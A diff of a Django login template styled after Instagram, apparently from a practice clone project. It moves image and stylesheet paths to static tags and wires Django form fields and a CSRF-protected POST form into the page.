@@ -4,7 +4,7 @@
 <head>
 	<meta charset="UTF-8">
 	<title>Instagram Login Page</title>
-	<link rel="stylesheet" href={% static 'usersApp/login.css'%}>
+	<link rel="stylesheet" href={% static 'usersApp/css/login.css'%}>
 </head>
 <body>
 
@@ -12,19 +12,31 @@
 	<div class="header">
 		<div class="top">
 			<div class="logo">
-				<img src="instagram.png" alt="instagram" style="width: 175px;">
+				<img src="{% static 'usersApp/icons/instagram.png' %}" alt="instagram" style="width: 175px;">
 			</div>
 			<div class="form">
+				
+				<form action="" method="post">
+					{%csrf_token%}
 
-				<div class="input_field">
+				<!-- <div class="input_field">
 					<input type="text" placeholder="Phone number, username, or email" class="input">
 				</div>
-
 				<div class="input_field">
 					<input type="password" placeholder="Password" class="input">
+				</div> -->
+				
+				<div class="input_field">
+					{{form.username}}
 				</div>
-                
-				<div class="btn"><a href="#">Log In</a></div>
+				
+				<div class="input_field">
+					{{form.password}}
+				</div>
+				
+				<!-- <div class="btn"><a href="#">Log In</a></div> -->
+				<input type="submit" value="Log in">
+				</form>
 			</div>
 			<div class="or">
 				<div class="line"></div>
@@ -33,7 +45,7 @@
 			</div>
 			<div class="dif">
 				<div class="fb">
-					<img src="facebook.png" alt="facebook">
+					<img src="{% static 'usersApp/icons/facebook.png' %}" alt="facebook">
 					<p>Log in with Facebook</p>
 				</div>
 				<div class="forgot">
